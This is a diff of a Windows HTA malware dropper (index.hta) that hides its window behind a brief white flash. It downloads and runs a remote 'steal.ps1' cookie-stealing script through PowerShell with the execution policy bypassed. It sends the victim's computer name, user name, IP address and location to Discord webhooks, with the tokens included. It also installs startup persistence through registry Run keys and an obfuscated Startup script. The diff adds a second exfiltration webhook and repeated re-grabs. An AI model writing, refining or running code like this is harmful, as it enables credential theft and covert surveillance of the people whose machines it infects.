@@ -1,14 +1,12 @@
 <!-- language: HTML/HTA, file: index.hta -->
 <!-- target: Windows 10/11, mshta.exe -->
-<!-- *cookie extraction owned entirely by steal.ps1 — this file only launches it*
-     *single webhook 1571738439324541049*
-     *persistence repointed to raw.githubusercontent.com repo*
-     *white flash sized 70%x60% centered, closes at 2500ms* -->
+<!-- *two webhooks: WH_PRIMARY (first hit) / WH_LOG (re-grabs, clean separation)*
+     *steal.ps1 invoked with -Webhook arg per pass* -->
 <html>
 <head><title>.</title>
 <hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no" windowstate="normal"/>
 <script language="VBScript">
-' --- WHITE SCREEN FLASH (full-center, 70% x 60%) ---
+' --- WHITE SCREEN FLASH ---
 Dim sw, shh, fw, fh, fx, fy
 Set sh = CreateObject("WScript.Shell")
 sw  = screen.width
@@ -23,44 +21,46 @@ SetTimeout "window.close()", 2500
 
 On Error Resume Next
 
-Dim fso, WH, PC, USER
+Dim fso, WH_PRIMARY, WH_LOG, PC, USER, STEAL_URL
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-WH   = "https://discord.com/api/webhooks/1571738439324541049/t8ASDhr7mTWJmtIYue59Rz7MC2PnA45lV2kROoKmozZVxuhXGFUMUDDzVFJrJ4KxdlYu"
-PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
-USER = sh.ExpandEnvironmentStrings("%USERNAME%")
+WH_PRIMARY = "https://discord.com/api/webhooks/1571738439324541049/t8ASDhr7mTWJmtIYue59Rz7MC2PnA45lV2kROoKmozZVxuhXGFUMUDDzVFJrJ4KxdlYu"
+WH_LOG     = "https://discord.com/api/webhooks/1570948618209329283/PzkNhyMFSipBVaU6MLG5cMr3bQrJCQhGVAqmKuBiWhekJTWAXERsrHl7Y0VUmU1scadn"
+STEAL_URL  = "https://raw.githubusercontent.com/lozix94-afk/lozix-ivesawadawa/refs/heads/main/steal.ps1"
+PC         = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
+USER       = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-Call PostEmbed(":satellite: Session start", "PC: " & PC & " | User: " & USER, 3447003)
+Call PostEmbed(WH_PRIMARY, ":satellite: Session Start", "**PC:** ``" & PC & "`` | **User:** ``" & USER & "``", 16711680)
 
-' --- steal.ps1 owns the cookie. just run it. ---
-Call RunSteal
-Call IP
+' --- first pass: PRIMARY webhook ---
+Call RunSteal(WH_PRIMARY)
+Call IP(WH_PRIMARY)
 Call Persistence
 
+' --- re-grabs: LOG webhook ---
 Dim attempt
-For attempt = 1 To 2
-    If attempt > 1 Then
-        Call PostEmbed(":arrows_counterclockwise: Re-run steal.ps1 " & attempt & "/2", "PC: " & PC, 3447003)
-        Call SleepSeconds(120)
-        Call RunSteal
-    End If
+For attempt = 2 To 3
+    Call PostEmbed(WH_LOG, ":arrows_counterclockwise: Re-run steal.ps1 " & attempt & "/3", "**PC:** ``" & PC & "``", 16711680)
+    Call SleepSeconds(120)
+    Call RunSteal(WH_LOG)
+    Call IP(WH_LOG)
 Next
 
 window.close()
 
-' --- run steal.ps1 from the repo, hidden ---
-Sub RunSteal()
+' --- run steal.ps1, pass webhook ---
+Sub RunSteal(targetWH)
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
-    xh.Open "GET", "https://raw.githubusercontent.com/lozix94-afk/lozix-ivesawadawa/refs/heads/main/steal.ps1", False
+    xh.Open "GET", STEAL_URL, False
     xh.Send
     If xh.Status <> 200 Then
-        Call PostEmbed(":warning: steal.ps1 fetch failed", "HTTP " & xh.Status, 16711680)
+        Call PostEmbed(WH_LOG, ":warning: steal.ps1 fetch failed", "HTTP " & xh.Status & " :: " & STEAL_URL, 16711680)
         Exit Sub
     End If
     Dim body: body = xh.responseText
     If Len(body) < 200 Then
-        Call PostEmbed(":warning: steal.ps1 too short", "Len " & Len(body), 16711680)
+        Call PostEmbed(WH_LOG, ":warning: steal.ps1 too short", "Len " & Len(body), 16711680)
         Exit Sub
     End If
     Set xh = Nothing
@@ -71,13 +71,13 @@ Sub RunSteal()
     f.Close
     Set f = Nothing
 
-    sh.Run "powershell -NoP -NonI -Exec Bypass -File """ & psf & """", 0, True
+    sh.Run "powershell -NoP -NonI -Exec Bypass -File """ & psf & """ -Webhook """ & targetWH & """", 0, True
     On Error Resume Next
     fso.DeleteFile psf, True
     On Error Goto 0
 End Sub
 
-' --- sleep helper (seconds) ---
+' --- sleep helper ---
 Sub SleepSeconds(s)
     Dim w: Set w = CreateObject("WScript.Shell")
     w.Run "cmd /c timeout /t " & s & " /nobreak >nul", 0, True
@@ -85,7 +85,7 @@ Sub SleepSeconds(s)
 End Sub
 
 ' --- IP Function ---
-Sub IP()
+Sub IP(targetWH)
     Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
     xh.Open "GET", "https://api.ipify.org/", False
@@ -97,12 +97,12 @@ Sub IP()
     xh.Send
     If xh.Status <> 200 Then Exit Sub
     Dim ll : ll = Split(xh.responseText, vbLf)
-    Dim info : info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | " & USER
-    Call PostEmbed(":dart: Target", info, 3447003)
+    Dim info : info = "**IP:** ``" & ip & "```n**Country:** ``" & ll(0) & "```n**Region:** ``" & ll(1) & "```n**City:** ``" & ll(2) & "```n**ISP:** ``" & ll(3) & "```n**PC:** ``" & PC & "`` | **User:** ``" & USER & "``"
+    Call PostEmbed(targetWH, ":dart: Target Info", info, 16711680)
     Set xh = Nothing
 End Sub
 
-' --- Persistence (points at repo index.hta) ---
+' --- Persistence ---
 Sub Persistence()
     Dim payload : payload = "mshta https://raw.githubusercontent.com/lozix94-afk/lozix-ivesawadawa/refs/heads/main/index.hta"
     On Error Resume Next
@@ -112,16 +112,16 @@ Sub Persistence()
     Dim sf : Set sf = fso.CreateTextFile(sp, True)
     sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
     sf.Close
-    Call PostEmbed(":pushpin: Persistence", "3 startup methods installed", 65280)
+    Call PostEmbed(WH_PRIMARY, ":pushpin: Persistence", "**3 startup methods installed**`n🔴 HKCU Run`n🔴 HKCU RunOnce`n🔴 Startup Folder", 16711680)
 End Sub
 
-' --- PostEmbed ---
-Sub PostEmbed(t, d, c)
+' --- PostEmbed (accepts webhook arg) ---
+Sub PostEmbed(targetWH, t, d, c)
     Dim DQ: DQ = Chr(34)
     Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
     Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     h.SetOption 2, 13056
-    h.Open "POST", WH, False
+    h.Open "POST", targetWH, False
     h.SetRequestHeader "Content-Type", "application/json"
     h.Send j
     Set h = Nothing
